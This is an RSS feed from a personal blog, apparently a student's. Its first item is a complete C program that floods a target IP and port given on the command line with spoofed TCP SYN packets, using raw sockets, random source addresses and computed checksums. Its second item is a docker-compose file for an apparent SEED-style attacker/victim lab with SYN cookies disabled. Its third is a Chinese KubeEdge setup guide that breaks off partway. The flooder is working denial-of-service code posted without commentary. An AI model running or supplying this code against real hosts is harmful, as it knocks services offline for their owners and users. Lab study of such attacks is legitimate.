<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Muziyu&#39;s Blog</title>
    <link>http://example.com/</link>
    
    <atom:link href="http://example.com/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description></description>
    <pubDate>Wed, 17 Jul 2024 15:37:56 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>synflood</title>
      <link>http://example.com/2024/07/17/synflood/</link>
      <guid>http://example.com/2024/07/17/synflood/</guid>
      <pubDate>Wed, 17 Jul 2024 15:33:52 GMT</pubDate>
      
        
        
      <description>&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span c</description>
        
      
      
      
      <content:encoded><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;netinet/ip.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line"></span><br><span class="line">/* IP Header */</span><br><span class="line"></span><br><span class="line">struct ipheader &#123;</span><br><span class="line"></span><br><span class="line">  unsignedchar      iph_ihl:4, //IP header length</span><br><span class="line"></span><br><span class="line">    iph_ver:4; //IP version</span><br><span class="line"></span><br><span class="line">  unsignedchar      iph_tos; //Type of service</span><br><span class="line"></span><br><span class="line">  unsignedshortint iph_len; //IP Packet length (data + header)</span><br><span class="line"></span><br><span class="line">  unsignedshortint iph_ident; //Identification</span><br><span class="line"></span><br><span class="line">  unsignedshortint iph_flag:3, //Fragmentation flags</span><br><span class="line"></span><br><span class="line">    iph_offset:13; //Flags offset</span><br><span class="line"></span><br><span class="line">  unsignedchar      iph_ttl; //Time to Live</span><br><span class="line"></span><br><span class="line">  unsignedchar      iph_protocol; //Protocol type</span><br><span class="line"></span><br><span class="line">  unsignedshortint iph_chksum; //IP datagram checksum</span><br><span class="line"></span><br><span class="line">  struct  in_addr    iph_sourceip; //Source IP address</span><br><span class="line"></span><br><span class="line">  struct  in_addr    iph_destip;   //Destination IP address</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">/* TCP Header */</span><br><span class="line"></span><br><span class="line">struct tcpheader &#123;</span><br><span class="line"></span><br><span class="line">    u_short tcp_sport;               /* source port */</span><br><span class="line"></span><br><span class="line">    u_short tcp_dport;               /* destination port */</span><br><span class="line"></span><br><span class="line">    u_int   tcp_seq;                 /* sequence number */</span><br><span class="line"></span><br><span class="line">    u_int   tcp_ack;                 /* acknowledgement number */</span><br><span class="line"></span><br><span class="line">    u_char  tcp_offx2;               /* data offset, rsvd */</span><br><span class="line"></span><br><span class="line">#define TH_OFF(th)      (((th)-&gt;tcp_offx2 &amp;0xf0) &gt;&gt;4)</span><br><span class="line"></span><br><span class="line">    u_char  tcp_flags;</span><br><span class="line"></span><br><span class="line">#define TH_FIN  0x01</span><br><span class="line"></span><br><span class="line">#define TH_SYN  0x02</span><br><span class="line"></span><br><span class="line">#define TH_RST  0x04</span><br><span class="line"></span><br><span class="line">#define TH_PUSH0x08</span><br><span class="line"></span><br><span class="line">#define TH_ACK  0x10</span><br><span class="line"></span><br><span class="line">#define TH_URG  0x20</span><br><span class="line"></span><br><span class="line">#define TH_ECE  0x40</span><br><span class="line"></span><br><span class="line">#define TH_CWR  0x80</span><br><span class="line"></span><br><span class="line">#define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)</span><br><span class="line"></span><br><span class="line">    u_short tcp_win;                 /* window */</span><br><span class="line"></span><br><span class="line">    u_short tcp_sum;                 /* checksum */</span><br><span class="line"></span><br><span class="line">    u_short tcp_urp;                 /* urgent pointer */</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">/* Psuedo TCP header */</span><br><span class="line"></span><br><span class="line">struct pseudo_tcp</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    unsigned saddr, daddr;</span><br><span class="line"></span><br><span class="line">    unsignedchar mbz;</span><br><span class="line"></span><br><span class="line">    unsignedchar ptcl;</span><br><span class="line"></span><br><span class="line">    unsignedshort tcpl;</span><br><span class="line"></span><br><span class="line">    struct tcpheader tcp;</span><br><span class="line"></span><br><span class="line">    char payload[1500];</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//#define DEST_IP    &quot;10.9.0.5&quot;</span><br><span class="line"></span><br><span class="line">//#define DEST_PORT  23  // Attack the web server</span><br><span class="line"></span><br><span class="line">#define PACKET_LEN1500</span><br><span class="line"></span><br><span class="line">unsignedshort calculate_tcp_checksum(struct ipheader *ip);</span><br><span class="line"></span><br><span class="line">/*************************************************************</span><br><span class="line"></span><br><span class="line">  Given an IP packet, send it out using a raw socket.</span><br><span class="line"></span><br><span class="line">**************************************************************/</span><br><span class="line"></span><br><span class="line">void send_raw_ip_packet(struct ipheader* ip)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    struct sockaddr_in dest_info;</span><br><span class="line"></span><br><span class="line">    int enable = 1;</span><br><span class="line"></span><br><span class="line">    // Step 1: Create a raw network socket.</span><br><span class="line"></span><br><span class="line">    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line"></span><br><span class="line">    if (sock &lt; 0) &#123;</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;socket() failed: %s\n&quot;, strerror(errno));</span><br><span class="line"></span><br><span class="line">    exit(1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Step 2: Set socket option.</span><br><span class="line"></span><br><span class="line">    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,</span><br><span class="line"></span><br><span class="line">    &amp;enable, sizeof(enable));</span><br><span class="line"></span><br><span class="line">    // Step 3: Provide needed information about destination.</span><br><span class="line"></span><br><span class="line">    dest_info.sin_family = AF_INET;</span><br><span class="line"></span><br><span class="line">    dest_info.sin_addr = ip-&gt;iph_destip;</span><br><span class="line"></span><br><span class="line">    // Step 4: Send the packet out.</span><br><span class="line"></span><br><span class="line">    sendto(sock, ip, ntohs(ip-&gt;iph_len), 0,</span><br><span class="line"></span><br><span class="line">    (struct sockaddr *)&amp;dest_info, sizeof(dest_info));</span><br><span class="line"></span><br><span class="line">    close(sock);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/******************************************************************</span><br><span class="line"></span><br><span class="line">  Spoof a TCP SYN packet.</span><br><span class="line"></span><br><span class="line">*******************************************************************/</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line"></span><br><span class="line">   char buffer[PACKET_LEN];</span><br><span class="line"></span><br><span class="line">   struct ipheader *ip = (struct ipheader *) buffer;</span><br><span class="line"></span><br><span class="line">   struct tcpheader *tcp = (struct tcpheader *) (buffer +</span><br><span class="line"></span><br><span class="line">    sizeof(struct ipheader));</span><br><span class="line"></span><br><span class="line">   if (argc &lt; 3) &#123;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Please provide IP and Port number\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Usage: synflood ip port\n&quot;);</span><br><span class="line"></span><br><span class="line">    exit(1);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   char *DEST_IP   = argv[1];</span><br><span class="line"></span><br><span class="line">   int DEST_PORT   = atoi(argv[2]);</span><br><span class="line"></span><br><span class="line">   srand(time(0)); // Initialize the seed for random # generation.</span><br><span class="line"></span><br><span class="line">   while (1) &#123;</span><br><span class="line"></span><br><span class="line">    memset(buffer, 0, PACKET_LEN);</span><br><span class="line"></span><br><span class="line">    /*********************************************************</span><br><span class="line"></span><br><span class="line">    Step 1: Fill in the TCP header.</span><br><span class="line"></span><br><span class="line">    ********************************************************/</span><br><span class="line"></span><br><span class="line">    tcp-&gt;tcp_sport = rand(); // Use random source port</span><br><span class="line"></span><br><span class="line">    tcp-&gt;tcp_dport = htons(DEST_PORT);</span><br><span class="line"></span><br><span class="line">    tcp-&gt;tcp_seq   = rand(); // Use random sequence #</span><br><span class="line"></span><br><span class="line">    tcp-&gt;tcp_offx2 = 0x50;</span><br><span class="line"></span><br><span class="line">    tcp-&gt;tcp_flags = TH_SYN; // Enable the SYN bit</span><br><span class="line"></span><br><span class="line">    tcp-&gt;tcp_win   = htons(20000);</span><br><span class="line"></span><br><span class="line">    tcp-&gt;tcp_sum   = 0;</span><br><span class="line"></span><br><span class="line">    /*********************************************************</span><br><span class="line"></span><br><span class="line">    Step 2: Fill in the IP header.</span><br><span class="line"></span><br><span class="line">    ********************************************************/</span><br><span class="line"></span><br><span class="line">    ip-&gt;iph_ver = 4;   // Version (IPV4)</span><br><span class="line"></span><br><span class="line">    ip-&gt;iph_ihl = 5;   // Header length</span><br><span class="line"></span><br><span class="line">    ip-&gt;iph_ttl = 50;  // Time to live</span><br><span class="line"></span><br><span class="line">    ip-&gt;iph_sourceip.s_addr = rand(); // Use a random IP address</span><br><span class="line"></span><br><span class="line">    ip-&gt;iph_destip.s_addr = inet_addr(DEST_IP);</span><br><span class="line"></span><br><span class="line">    ip-&gt;iph_protocol = IPPROTO_TCP; // The value is 6.</span><br><span class="line"></span><br><span class="line">    ip-&gt;iph_len = htons(sizeof(struct ipheader) +</span><br><span class="line"></span><br><span class="line">    sizeof(struct tcpheader));</span><br><span class="line"></span><br><span class="line">    // Calculate tcp checksum</span><br><span class="line"></span><br><span class="line">    tcp-&gt;tcp_sum = calculate_tcp_checksum(ip);</span><br><span class="line"></span><br><span class="line">    /*********************************************************</span><br><span class="line"></span><br><span class="line">    Step 3: Finally, send the spoofed packet</span><br><span class="line"></span><br><span class="line">    ********************************************************/</span><br><span class="line"></span><br><span class="line">    send_raw_ip_packet(ip);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   return0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsignedshort in_cksum (unsignedshort *buf, int length)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   unsignedshort *w = buf;</span><br><span class="line"></span><br><span class="line">   int nleft = length;</span><br><span class="line"></span><br><span class="line">   int sum = 0;</span><br><span class="line"></span><br><span class="line">   unsignedshort temp=0;</span><br><span class="line"></span><br><span class="line">   /*</span><br><span class="line"></span><br><span class="line">    * The algorithm uses a 32 bit accumulator (sum), adds</span><br><span class="line"></span><br><span class="line">    * sequential 16 bit words to it, and at the end, folds back all</span><br><span class="line"></span><br><span class="line">    * the carry bits from the top 16 bits into the lower 16 bits.</span><br><span class="line"></span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">   while (nleft &gt; 1)  &#123;</span><br><span class="line"></span><br><span class="line">    sum += *w++;</span><br><span class="line"></span><br><span class="line">    nleft -= 2;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   /* treat the odd byte at the end, if any */</span><br><span class="line"></span><br><span class="line">   if (nleft == 1) &#123;</span><br><span class="line"></span><br><span class="line">    *(u_char *)(&amp;temp) = *(u_char *)w ;</span><br><span class="line"></span><br><span class="line">    sum += temp;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   /* add back carry outs from top 16 bits to low 16 bits */</span><br><span class="line"></span><br><span class="line">   sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);  // add hi 16 to low 16</span><br><span class="line"></span><br><span class="line">   sum += (sum &gt;&gt; 16);                  // add carry</span><br><span class="line"></span><br><span class="line">   return (unsignedshort)(~sum);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/****************************************************************</span><br><span class="line"></span><br><span class="line">  TCP checksum is calculated on the pseudo header, which includes</span><br><span class="line"></span><br><span class="line">  the TCP header and data, plus some part of the IP header.</span><br><span class="line"></span><br><span class="line">  Therefore, we need to construct the pseudo header first.</span><br><span class="line"></span><br><span class="line">*****************************************************************/</span><br><span class="line"></span><br><span class="line">unsignedshort calculate_tcp_checksum(struct ipheader *ip)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   struct tcpheader *tcp = (struct tcpheader *)((u_char *)ip +</span><br><span class="line"></span><br><span class="line">    sizeof(struct ipheader));</span><br><span class="line"></span><br><span class="line">   int tcp_len = ntohs(ip-&gt;iph_len) - sizeof(struct ipheader);</span><br><span class="line"></span><br><span class="line">   /* pseudo tcp header for the checksum computation */</span><br><span class="line"></span><br><span class="line">   struct pseudo_tcp p_tcp;</span><br><span class="line"></span><br><span class="line">   memset(&amp;p_tcp, 0x0, sizeof(struct pseudo_tcp));</span><br><span class="line"></span><br><span class="line">   p_tcp.saddr  = ip-&gt;iph_sourceip.s_addr;</span><br><span class="line"></span><br><span class="line">   p_tcp.daddr  = ip-&gt;iph_destip.s_addr;</span><br><span class="line"></span><br><span class="line">   p_tcp.mbz    = 0;</span><br><span class="line"></span><br><span class="line">   p_tcp.ptcl   = IPPROTO_TCP;</span><br><span class="line"></span><br><span class="line">   p_tcp.tcpl   = htons(tcp_len);</span><br><span class="line"></span><br><span class="line">   memcpy(&amp;p_tcp.tcp, tcp, tcp_len);</span><br><span class="line"></span><br><span class="line">   return  (unsignedshort) in_cksum((unsignedshort *)&amp;p_tcp,</span><br><span class="line"></span><br><span class="line">    tcp_len + 12);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2024/07/17/synflood/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>copy.md</title>
      <link>http://example.com/2024/07/17/copy-md/</link>
      <guid>http://example.com/2024/07/17/copy-md/</guid>
      <pubDate>Wed, 17 Jul 2024 15:29:12 GMT</pubDate>
      
        
        
      <description>&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span c</description>
        
      
      
      
      <content:encoded><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">version: &quot;3&quot;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">    attacker:</span><br><span class="line">        image: handsonsecurity/seed-ubuntu:large</span><br><span class="line">        container_name: seed-attacker</span><br><span class="line">        tty: true</span><br><span class="line">        cap_add:</span><br><span class="line">                - ALL</span><br><span class="line">        privileged: true</span><br><span class="line">        volumes:</span><br><span class="line">                - ./volumes:/volumes</span><br><span class="line">        network_mode: host</span><br><span class="line"></span><br><span class="line">    Victim:</span><br><span class="line">        image: handsonsecurity/seed-ubuntu:large</span><br><span class="line">        container_name: victim-10.9.0.5</span><br><span class="line">        tty: true</span><br><span class="line">        cap_add:</span><br><span class="line">                - ALL</span><br><span class="line">        privileged: true</span><br><span class="line">        sysctls:</span><br><span class="line">                - net.ipv4.tcp_syncookies=0</span><br><span class="line"></span><br><span class="line">    networks:</span><br><span class="line">            net-10.9.0.0:</span><br><span class="line">                ipv4_address: 10.9.0.5</span><br><span class="line"></span><br><span class="line">    command: bash -c &quot;</span><br><span class="line">                      /etc/init.d/openbsd-inetd start  &amp;&amp;</span><br><span class="line">                      tail -f /dev/null</span><br><span class="line">                 &quot;</span><br><span class="line"></span><br><span class="line">    User1:</span><br><span class="line">        image: handsonsecurity/seed-ubuntu:large</span><br><span class="line">        container_name: user1-10.9.0.6</span><br><span class="line">        tty: true</span><br><span class="line">        cap_add:</span><br><span class="line">                - ALL</span><br><span class="line">        networks:</span><br><span class="line">            net-10.9.0.0:</span><br><span class="line">                ipv4_address: 10.9.0.6</span><br><span class="line"></span><br><span class="line">    command: bash -c &quot;</span><br><span class="line">                      /etc/init.d/openbsd-inetd start  &amp;&amp;</span><br><span class="line">                      tail -f /dev/null</span><br><span class="line">                 &quot;</span><br><span class="line"></span><br><span class="line">    User2:</span><br><span class="line">        image: handsonsecurity/seed-ubuntu:large</span><br><span class="line">        container_name: user2-10.9.0.7</span><br><span class="line">        tty: true</span><br><span class="line">        cap_add:</span><br><span class="line">                - ALL</span><br><span class="line">        networks:</span><br><span class="line">            net-10.9.0.0:</span><br><span class="line">                ipv4_address: 10.9.0.7</span><br><span class="line"></span><br><span class="line">    command: bash -c &quot;</span><br><span class="line">                      /etc/init.d/openbsd-inetd start  &amp;&amp;</span><br><span class="line">                      tail -f /dev/null</span><br><span class="line">                 &quot;</span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">    net-10.9.0.0:</span><br><span class="line">        name: net-10.9.0.0</span><br><span class="line">        ipam:</span><br><span class="line">            config:</span><br><span class="line">                - subnet: 10.9.0.0/24</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2024/07/17/copy-md/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>实验环境搭建</title>
      <link>http://example.com/2023/12/02/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link>
      <guid>http://example.com/2023/12/02/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid>
      <pubDate>Sat, 02 Dec 2023 11:32:12 GMT</pubDate>
      
      <description>经过调研，我们对现有的云边通信框架有了充分的认识与了解，但是尚停留在理论阶段，没有进行过实际测试。因此，我们在小组成员个人笔记本中分别搭建了Kubeedge、Openyurt以及SuperEdge的测试环境，部署了一个主节点和三个边缘节点用以进行测试。以下是实验搭建步骤。</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="KubeEdge搭建"><a href="#KubeEdge搭建" class="headerlink" title="KubeEdge搭建"></a>KubeEdge搭建</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>使用mininet搭建模拟网络环境</p><p>虚拟机硬件配置</p><table><thead><tr><th>型号</th><th>硬盘</th><th>内存</th><th>CPU</th></tr></thead><tbody><tr><td>vritualbox虚拟机</td><td>60G</td><td>2G</td><td>Intel i5-11320H 2核 3.2GHz</td></tr><tr><td>vritualbox虚拟机</td><td>60G</td><td>2G</td><td>Intel i5-11320H 2核 3.2GHz</td></tr><tr><td>vritualbox虚拟机</td><td>60G</td><td>2G</td><td>Intel i5-11320H 2核 3.2GHz</td></tr><tr><td>vritualbox虚拟机</td><td>60G</td><td>2G</td><td>Intel i5-11320H 2核 3.2GHz</td></tr></tbody></table><p>软件配置，由于兼容性问题，使用kubernetes1.23，KubeEdge1.12.2</p><table><thead><tr><th>主机名</th><th>IP</th><th>操作系统</th></tr></thead><tbody><tr><td>master</td><td>10.0.1.200（192.168.80.134）</td><td>Ubuntu20.04</td></tr><tr><td>node1</td><td>192.168.0.201（192.168.80.135）</td><td>Ubuntu20.04</td></tr><tr><td>node2</td><td>192.168.0.202（192.168.80.136）</td><td>Ubuntu20.04</td></tr><tr><td>node3</td><td>192.168.0.203</td><td>Ubuntu20.04</td></tr></tbody></table><h2 id="初始化系统配置"><a href="#初始化系统配置" class="headerlink" title="初始化系统配置"></a>初始化系统配置</h2><p>所有主机修改主机名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo hostnamectl set-hostname master</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>所有主机关闭防火墙</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 